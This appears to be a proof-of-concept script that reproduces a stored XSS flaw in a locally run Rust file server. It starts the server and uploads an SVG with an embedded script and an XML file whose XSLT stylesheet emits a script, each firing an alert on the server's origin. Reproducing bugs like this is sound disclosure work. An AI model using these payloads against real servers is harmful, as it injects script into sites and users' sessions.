#!/usr/bin/env python3

"""Stored XSS PoC: serve uploaded files inline and execute JS on the origin.

1. Start the server with upload enabled and a fixed CSRF token.
2. Upload the malicious payloads via multipart/form-data.
3. Open the printed URLs in a browser to confirm the alerts fire.

Payloads:
  - poc.svg : inline image/svg+xml with an embedded <script>.
  - poc.xml : text/xml referencing poc.xsl via xml-stylesheet.
  - poc.xsl : XSLT stylesheet that emits <script> when poc.xml is rendered.
"""

import os
import subprocess
import time
import urllib.request

HOST = "127.0.0.1"
PORT = 8888
SERVE_DIR = "uploads"
CSRF_TOKEN = "poc-token"

# (filename, content-type, body). Files are served back at /<filename>.
PAYLOADS = [
    (
        "poc.svg",
        "image/svg+xml",
        '<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60">\n'
        "  <script>alert('XSS on ' + document.domain)</script>\n"
        "</svg>\n",
    ),
    (
        "poc.xml",
        "text/xml",
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<?xml-stylesheet type="text/xsl" href="poc.xsl"?>\n'
        "<root>text/xml XSLT-XSS PoC</root>\n",
    ),
    (
        "poc.xsl",
        "text/xml",
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<xsl:stylesheet version="1.0"\n'
        '    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n'
        '  <xsl:output method="html"/>\n'
        '  <xsl:template match="/">\n'
        '    <html xmlns="http://www.w3.org/1999/xhtml">\n'
        "      <body>\n"
        "        <h2>text/xml XSLT-XSS PoC</h2>\n"
        "        <script>alert('XSLT-XSS on ' + document.domain)</script>\n"
        "      </body>\n"
        "    </html>\n"
        "  </xsl:template>\n"
        "</xsl:stylesheet>\n",
    ),
]

VERIFY = ["poc.svg", "poc.xml"]

base_url = f"http://{HOST}:{PORT}"

# The server requires the root directory to exist.
os.makedirs(SERVE_DIR, exist_ok=True)

# Start the server.
server = subprocess.Popen(
    ["cargo", "run", "--", "-p", str(PORT), "-u", "--csrf", CSRF_TOKEN, SERVE_DIR],
)

# Wait until it accepts connections.
for _ in range(60):
    try:
        urllib.request.urlopen(base_url, timeout=1)
        break
    except urllib.error.HTTPError:
        break
    except OSError:
        time.sleep(1)

# Build one multipart/form-data body carrying the CSRF token and every payload.
boundary = "----pocboundary"
parts = [
    f"--{boundary}\r\n"
    'Content-Disposition: form-data; name="csrf"\r\n\r\n'
    f"{CSRF_TOKEN}\r\n"
]
for filename, content_type, body_text in PAYLOADS:
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="files"; filename="{filename}"\r\n'
        f"Content-Type: {content_type}\r\n\r\n"
        f"{body_text}\r\n"
    )
parts.append(f"--{boundary}--\r\n")
body = "".join(parts).encode()

req = urllib.request.Request(
    base_url,
    data=body,
    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    method="POST",
)
with urllib.request.urlopen(req) as resp:
    resp.read()

print("\nUploaded. Open in a browser to confirm XSS:")
for name in VERIFY:
    print(f"  {base_url}/{name}")
print()

server.wait()
